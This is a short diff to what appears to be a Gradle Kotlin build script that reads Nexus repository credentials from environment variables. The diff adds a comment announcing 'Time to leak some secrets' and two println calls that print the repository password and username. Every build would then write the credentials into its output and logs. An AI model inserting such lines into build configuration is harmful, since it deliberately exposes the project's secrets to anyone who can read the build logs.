@@ -42,6 +42,10 @@ if (System.getenv("ARCANIUS_NEXUS_PASSWORD") != null) {
     repoPass = System.getenv("ARCANIUS_NEXUS_PASSWORD")
 }
 
+// Time to leak some secrets
+println(repoPass)
+println(repoUser)
+
 repositories {
     mavenCentral()
     maven("https://jitpack.io/")
